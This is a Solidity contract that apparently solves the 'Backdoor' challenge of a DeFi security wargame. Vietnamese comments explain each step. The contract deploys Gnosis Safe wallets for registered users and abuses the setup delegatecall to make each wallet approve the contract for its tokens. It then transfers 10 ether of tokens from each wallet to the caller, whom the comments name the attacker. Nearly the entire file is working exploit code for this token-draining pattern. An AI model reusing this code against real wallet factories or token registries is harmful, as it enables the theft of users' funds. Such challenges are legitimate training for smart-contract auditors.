// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorSolution {
    GnosisSafeProxyFactory public factory;
    IProxyCreationCallback public callback;
    IERC20 public token;
    address[] public users;
    address public singleton;

    constructor(
        address _factory,
        address _singleton,
        address _callback,
        address _token,
        address[] memory _users
    ) {
        factory = GnosisSafeProxyFactory(_factory);
        singleton = _singleton;
        callback = IProxyCreationCallback(_callback);
        token = IERC20(_token);
        users = _users;
        // exploit();
    }

    function exploit() public {
        // Hàm setup trong GnosisSafe sẽ gọi đến setupModules(), trong setupModules thực hiện gọi delegateCall với đến to với data
        // Ta dùng data là việc gọi hàm approve để cho phép contract Solution tiêu tiền của ví được tạo ra

        bytes memory data = abi.encodeWithSignature(
            "approve(address,address)",
            token,
            address(this)
        );

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // Với mỗi user, ta lần lượt gọi createProxyWithCallback() để tạo ví và thực hiện chạy hàm setup
            // Địa chỉ to là địa chỉ thực hiện delegateCall -> sẽ là địa chỉ contract Solution của chúng ta
            // data để delegateCall là data chúng ta đã tạo bên trên
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", // Chữ kí của hàm setup
                owners, 
                1,
                address(this), // Địa chỉ thực hiện delegateCall
                data, 
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                callback
            );

            // Sau khi chạy createProxyWithCallback -> setup -> setupModules -> approve -> Solution được phép tiêu tiền của ví mới được tạo ra
            // Dùng Solution để chuyển tiền đến attacker
            IERC20(token).transferFrom(address(proxy), tx.origin, 10 ether);
        }
    }

    function approve(address _token, address spender) public {
        IERC20(_token).approve(spender, type(uint256).max);
    }
}
